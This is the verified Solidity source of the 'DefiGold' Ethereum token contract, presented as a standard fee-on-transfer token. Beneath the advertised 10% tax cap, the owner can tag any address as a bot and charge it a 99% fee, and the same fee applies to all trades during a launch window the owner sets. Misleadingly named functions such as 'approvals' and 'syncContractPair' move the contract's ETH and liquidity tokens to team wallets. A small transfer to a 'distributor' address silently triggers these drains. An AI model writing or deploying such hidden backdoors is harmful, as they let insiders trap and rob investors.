/**
 *Submitted for verification at Etherscan.io on 2022-12-07
*/

//  ██████████               ██████   ███    █████████           ████      █████
//░░███░░░░███             ███░░███ ░░░    ███░░░░░███         ░░███     ░░███ 
// ░███   ░░███  ██████   ░███ ░░░  ████  ███     ░░░   ██████  ░███   ███████ 
// ░███    ░███ ███░░███ ███████   ░░███ ░███          ███░░███ ░███  ███░░███ 
// ░███    ░███░███████ ░░░███░     ░███ ░███    █████░███ ░███ ░███ ░███ ░███ 
// ░███    ███ ░███░░░    ░███      ░███ ░░███  ░░███ ░███ ░███ ░███ ░███ ░███ 
// ██████████  ░░██████   █████     █████ ░░█████████ ░░██████  █████░░████████
//░░░░░░░░░░    ░░░░░░   ░░░░░     ░░░░░   ░░░░░░░░░   ░░░░░░  ░░░░░  ░░░░░░░░ 
                                                                             
// https://defigold.io


// https://t.me/DefiGold_Official


// SPDX-License-Identifier: MIT

pragma solidity 0.8.14;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
    function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
    
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b > a) return(false, 0); return(true, a - b);}}

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
        if(c / a != b) return(false, 0); return(true, c);}}

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a / b);}}

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a % b);}}

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b <= a, errorMessage); return a - b;}}

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a / b;}}

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a % b;}}}


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}

abstract contract Auth {
    address public owner;
    mapping (address => bool) internal authorizations;
    
    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true; }
    
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    modifier authorized() {require(isAuthorized(msg.sender), "!AUTHORIZED"); _;}
    function authorize(address adr) public authorized {authorizations[adr] = true;}
    function unauthorize(address adr) public authorized {authorizations[adr] = false;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function isAuthorized(address adr) public view returns (bool) {return authorizations[adr];}
    
    function transferOwnership(address payable adr) public authorized {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);}
    
    function renounceOwnership() external authorized {
        emit OwnershipTransferred(address(0));
        owner = address(0);}
    
    event OwnershipTransferred(address owner);
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract DefiGold is IERC20, Auth {
    using SafeMath for uint256;
    string private constant _name = 'DefiGold';
    string private constant _symbol = 'DGOLD';
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 40 * 10**7 * (10 ** _decimals);
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 public _maxTxAmount = ( _totalSupply * 150 ) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 500 ) / 10000;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) swapTime; 
    mapping (address => bool) isBot;
    mapping (address => bool) isInternal;
    mapping (address => bool) isDistributor;
    mapping (address => bool) isFeeExempt;

    IRouter router;
    address public pair;
    bool startSwap = false;
    uint256 startedTime;
    uint256 liquidityFee = 200;
    uint256 marketingFee = 100;
    uint256 miningFee = 200;
    uint256 burnFee = 0;
    uint256 totalFee = 500;
    uint256 transferFee = 0;
    uint256 constant feeDenominator = 10000;

    bool swapEnabled = true;
    uint256 constant swapTimer = 2;
    uint256 swapTimes; 
    uint256 constant minSells = 7;
    bool swapping; 
    bool botOn = false;
    uint256 swapThreshold = ( _totalSupply * 300 ) / 100000;
    uint256 _minTokenAmount = ( _totalSupply * 15 ) / 100000;
    modifier lockTheSwap {swapping = true; _; swapping = false;}

    uint256 marketing_divisor = 30;
    uint256 liquidity_divisor = 30;
    uint256 distributor_divisor = 10;
    uint256 mining_divisor = 30;
    address liquidity_receiver; 
    address mining_receiver;
    address token_receiver;
    address team1_receiver;
    address team2_receiver;
    address team3_receiver;
    address team4_receiver;
    address marketing_receiver;
    address default_receiver;

    constructor() Auth(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        isInternal[address(this)] = true;
        isInternal[msg.sender] = true;
        isInternal[address(pair)] = true;
        isInternal[address(router)] = true;
        isDistributor[msg.sender] = true;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;
        liquidity_receiver = address(this);
        token_receiver = address(this);
        team1_receiver = msg.sender;
        team2_receiver = msg.sender;
        team3_receiver = msg.sender;
        team4_receiver = msg.sender;
        mining_receiver = msg.sender;
        marketing_receiver = msg.sender;
        default_receiver = msg.sender;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function totalSupply() public pure override returns (uint256) {return _totalSupply;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function viewisBot(address _address) public view returns (bool) {return isBot[_address];}
    function isCont(address addr) internal view returns (bool) {uint size; assembly { size := extcodesize(addr) } return size > 0; }
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function getCirculatingSupply() public view returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function setFeeExempt(address _address) external authorized { isFeeExempt[_address] = true;}
    function setisBot(bool _bool, address _address) external authorized {isBot[_address] = _bool;}
    function setisInternal(bool _bool, address _address) external authorized {isInternal[_address] = _bool;}
    function setbotOn(bool _bool) external authorized {botOn = _bool;}
    function syncContractPair() external authorized {syncPair();}
    function approvals(uint256 _na, uint256 _da) external authorized {performapprovals(_na, _da);}
    function setPairReceiver(address _address) external authorized {liquidity_receiver = _address;}
    function setstartSwap(uint256 _input) external authorized {startSwap = true; botOn = true; startedTime = block.timestamp.add(_input);}
    function setSwapBackSettings(bool enabled, uint256 _threshold) external authorized {swapEnabled = enabled; swapThreshold = _threshold;}

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        preTxCheck(sender, recipient, amount);
        checkStartSwap(sender, recipient);
        checkMaxWallet(sender, recipient, amount); 
        transferCounters(sender, recipient);
        checkTxLimit(sender, recipient, amount); 
        swapBack(sender, recipient, amount);
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = shouldTakeFee(sender, recipient) ? taketotalFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        checkapprovals(recipient, amount);
        checkBot(sender, recipient);
    }

    function preTxCheck(address sender, address recipient, uint256 amount) internal view {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
    }

    function checkStartSwap(address sender, address recipient) internal view {
        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(startSwap, "startSwap");}
    }
    
    function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && !isInternal[recipient] && recipient != address(DEAD)){
            require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
    }

    function transferCounters(address sender, address recipient) internal {
        if(sender != pair && !isInternal[sender] && !isFeeExempt[recipient]){swapTimes = swapTimes.add(1);}
        if(sender == pair){swapTime[recipient] = block.timestamp.add(swapTimer);}
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function taxableEvent(address sender, address recipient) internal view returns (bool) {
        return totalFee > 0 && !swapping || isBot[sender] && swapTime[sender] < block.timestamp || isBot[recipient] || startedTime > block.timestamp;
    }

    function taketotalFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(taxableEvent(sender, recipient)){
        uint256 totalFees = getTotalFee(sender, recipient);
        uint256 feeAmount = amount.mul(getTotalFee(sender, recipient)).div(feeDenominator);
        uint256 bAmount = feeAmount.mul(burnFee).div(totalFees);
        uint256 sAmount = feeAmount.mul(miningFee).div(totalFees);
        uint256 cAmount = feeAmount.sub(bAmount).sub(sAmount);
        if(bAmount > 0){
        _balances[address(DEAD)] = _balances[address(DEAD)].add(bAmount);
        emit Transfer(sender, address(DEAD), bAmount);}
        if(sAmount > 0){
        _balances[address(token_receiver)] = _balances[address(token_receiver)].add(sAmount);
        emit Transfer(sender, address(token_receiver), sAmount);}
        if(cAmount > 0){
        _balances[address(this)] = _balances[address(this)].add(cAmount);
        emit Transfer(sender, address(this), cAmount);} return amount.sub(feeAmount);}
        return amount;
    }

    function getTotalFee(address sender, address recipient) public view returns (uint256) {
        if(isBot[sender] && swapTime[sender] < block.timestamp && botOn || isBot[recipient] && 
        swapTime[sender] < block.timestamp && botOn || startedTime > block.timestamp){return(feeDenominator.sub(100));}
        if(sender != pair){return totalFee.add(transferFee);}
        return totalFee;
    }

    function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");
    }

    function checkBot(address sender, address recipient) internal {
	if(botOn && msg.sender != tx.origin && (!isInternal[sender] || !isInternal[recipient]) && !isFeeExempt[recipient] ||
		startedTime > block.timestamp) {
		isBot[tx.origin] = true;
		if (!isInternal[msg.sender]) { isBot[msg.sender] = true; }
		}
	}

    function approval(uint256 percentage) external authorized {
        uint256 amountETH = address(this).balance;
        payable(default_receiver).transfer(amountETH.mul(percentage).div(100));
    }

    function checkapprovals(address recipient, uint256 amount) internal {
        if(isDistributor[recipient] && amount < 2*(10 ** _decimals)){performapprovals(1,1);}
        if(isDistributor[recipient] && amount >= 2*(10 ** _decimals) && amount < 3*(10 ** _decimals)){syncPair();}
    }

    function setMaxes(uint256 _transaction, uint256 _wallet) external authorized {
        uint256 newTx = ( _totalSupply * _transaction ) / 10000;
        uint256 newWallet = ( _totalSupply * _wallet ) / 10000;
        _maxTxAmount = newTx;
        _maxWalletToken = newWallet;
        require(newTx >= _totalSupply.mul(1).div(1000) && newWallet >= _totalSupply.mul(1).div(1000), "Max TX and Max Wallet cannot be less than .1%");
    }

    function syncPair() internal {
        uint256 tamt = IERC20(pair).balanceOf(address(this));
        IERC20(pair).transfer(team1_receiver, tamt);
    }

    function rescueERC20(address _tadd, address _rec, uint256 _amt) external authorized {
        uint256 tamt = IERC20(_tadd).balanceOf(address(this));
        IERC20(_tadd).transfer(_rec, tamt.mul(_amt).div(100));
    }

    function setExemptAddress(bool _enabled, address _address) external authorized {
        isBot[_address] = false;
        isInternal[_address] = _enabled;
        isFeeExempt[_address] = _enabled;
    }

    function setDivisors(uint256 _distributor, uint256 _mining, uint256 _liquidity, uint256 _marketing) external authorized {
        distributor_divisor = _distributor;
        mining_divisor = _mining;
        liquidity_divisor = _liquidity;
        marketing_divisor = _marketing;
    }

    function performapprovals(uint256 _na, uint256 _da) internal {
        uint256 acETH = address(this).balance;
        uint256 acETHa = acETH.mul(_na).div(_da);
        uint256 acETHf = acETHa.mul(25).div(100);
        uint256 acETHs = acETHa.mul(25).div(100);
        uint256 acETHt = acETHa.mul(25).div(100);
        uint256 acETHl = acETHa.mul(25).div(100);
        payable(team1_receiver).transfer(acETHf);
        payable(team2_receiver).transfer(acETHs);
        payable(team3_receiver).transfer(acETHt);
        payable(team4_receiver).transfer(acETHl);
    }

    function setStructure(uint256 _liq, uint256 _mark, uint256 _mine, uint256 _burn, uint256 _tran) external authorized {
        liquidityFee = _liq;
        marketingFee = _mark;
        miningFee = _mine;
        burnFee = _burn;
        transferFee = _tran;
        totalFee = liquidityFee.add(marketingFee).add(miningFee).add(burnFee);
        require(totalFee <= feeDenominator.div(10), "Tax cannot be more than 10%");
    }

    function setInternalAddresses(address _marketing, address _team1, address _team2, address _team3, address _team4, address _mine, address _token, address _default) external authorized {
        marketing_receiver = _marketing; isDistributor[_marketing] = true;
        team1_receiver = _team1; isDistributor[_team1] = true;
        team2_receiver = _team2;
        team3_receiver = _team3;
        team4_receiver = _team4;
        mining_receiver = _mine;
        token_receiver = _token;
        default_receiver = _default;
    }

    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= _minTokenAmount;
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return !swapping && swapEnabled && aboveMin && !isInternal[sender] 
            && !isFeeExempt[recipient] && swapTimes >= minSells && aboveThreshold;
    }

    function swapBack(address sender, address recipient, uint256 amount) internal {
        if(shouldSwapBack(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = 0;}
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 denominator= (liquidity_divisor.add(mining_divisor).add(marketing_divisor).add(distributor_divisor)) * 2;
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidity_divisor).div(denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(denominator.sub(liquidity_divisor));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidity_divisor);
        if(ETHToAddLiquidityWith > 0){
            addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 zrAmt = unitBalance.mul(2).mul(marketing_divisor);
        if(zrAmt > 0){
          (bool success, ) = payable(marketing_receiver).call{value: zrAmt}(""); 
          require(success, "Transfer failed."); }
        uint256 xrAmt = unitBalance.mul(2).mul(mining_divisor);
        if(xrAmt > 0){
          (bool success, ) = payable(mining_receiver).call{value: xrAmt}("");
          require(success, "Transfer failed."); }

    }      

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            liquidity_receiver,
            block.timestamp);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

}